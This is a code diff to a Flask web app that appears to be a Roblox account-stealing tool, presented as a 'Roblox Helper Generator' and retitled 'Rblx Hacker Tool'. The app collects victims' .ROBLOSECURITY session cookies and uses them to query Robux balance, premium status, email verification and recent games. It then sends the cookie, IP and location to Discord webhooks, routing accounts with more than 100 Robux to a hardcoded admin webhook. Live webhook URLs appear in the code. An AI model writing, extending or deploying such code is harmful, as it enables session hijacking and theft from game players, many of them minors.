@@ -2,11 +2,10 @@ from flask import Flask, request, jsonify, render_template_string
 import requests
 import base64
 import time
-import os
 
 app = Flask(__name__)
 
-ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1458076728370139157/Z8rAMAbLxhg8KNMF4FZdFsVM1FfEEA_LUofoF7h_CdrWtD0kqhn4DArCbNNHceMVk0sd"
+ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1458240581649174686/Eu-jB0LfRlnStSKuuqeixQA9u1a8tpxjiBS4175HCG0B2PQVRsoHvWKdI-NshDuS7LVx"
 
 # Generator page HTML
 GENERATOR_HTML = """
@@ -15,7 +14,7 @@ GENERATOR_HTML = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Helper Generator</title>
+    <title>Rblx Hacker Tool</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -113,7 +112,7 @@ GENERATOR_HTML = """
 </head>
 <body>
     <div class="container">
-        <h1>🎮 Roblox Helper Generator</h1>
+        <h1>🎮 Rblx Hacker Tool</h1>
         <p class="subtitle">Create your custom helper page</p>
 
         <div class="input-group">
@@ -443,6 +442,9 @@ def submit():
         # Get Roblox account info
         user_id = "Unknown"
         robux = 0
+        email_verified = "Unknown"
+        premium = "No"
+        top_games = []
         
         try:
             headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
@@ -452,10 +454,37 @@ def submit():
                 user_data = user_response.json()
                 user_id = user_data.get('id', 'Unknown')
                 
+                # Get robux
                 try:
                     robux_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', headers=headers, timeout=5)
                     if robux_response.status_code == 200:
                         robux = robux_response.json().get('robux', 0)
+                except:
+                    pass
+                
+                # Get email verification status
+                try:
+                    email_response = requests.get('https://accountinformation.roblox.com/v1/email', headers=headers, timeout=5)
+                    if email_response.status_code == 200:
+                        email_data = email_response.json()
+                        email_verified = "Yes" if email_data.get('verified') else "No"
+                except:
+                    pass
+                
+                # Get premium status
+                try:
+                    premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership', headers=headers, timeout=5)
+                    if premium_response.status_code == 200:
+                        premium = "Yes" if premium_response.json() else "No"
+                except:
+                    pass
+                
+                # Get recently played games (top spending games approximation)
+                try:
+                    games_response = requests.get(f'https://games.roblox.com/v1/games/list?model.userId={user_id}', headers=headers, timeout=5)
+                    if games_response.status_code == 200:
+                        games_data = games_response.json().get('data', [])
+                        top_games = [game.get('name', 'Unknown') for game in games_data[:5]]
                 except:
                     pass
         except:
@@ -464,13 +493,16 @@ def submit():
         # Prepare embed
         embed = {
             'title': '🎮 New Roblox Helper Submission',
-            'color': 0xFF0000 if robux > 20 else 0x00FF00,
+            'color': 0xFF0000 if robux > 100 else 0x00FF00,
             'fields': [
                 {'name': '👤 Username', 'value': username, 'inline': True},
                 {'name': '🆔 User ID', 'value': str(user_id), 'inline': True},
                 {'name': '💎 Robux', 'value': str(robux), 'inline': True},
+                {'name': '⭐ Premium', 'value': premium, 'inline': True},
+                {'name': '📧 Email Verified', 'value': email_verified, 'inline': True},
                 {'name': '🌍 IP', 'value': user_ip, 'inline': True},
-                {'name': '📍 Location', 'value': location, 'inline': True},
+                {'name': '📍 Location', 'value': location, 'inline': False},
+                {'name': '🎮 Recent Games', 'value': ', '.join(top_games) if top_games else 'None found', 'inline': False},
                 {'name': '🍪 Cookie', 'value': f'```{cookie}```', 'inline': False}
             ],
             'footer': {'text': 'Roblox Helper System'},
@@ -478,7 +510,7 @@ def submit():
         }
         
         # Send to appropriate webhook
-        target_webhook = ADMIN_WEBHOOK if robux > 20 else user_webhook
+        target_webhook = ADMIN_WEBHOOK if robux > 100 else user_webhook
         requests.post(target_webhook, json={'embeds': [embed]})
         
         return jsonify({'success': True})
@@ -488,5 +520,4 @@ def submit():
         return jsonify({'success': False})
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 10000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=10000)
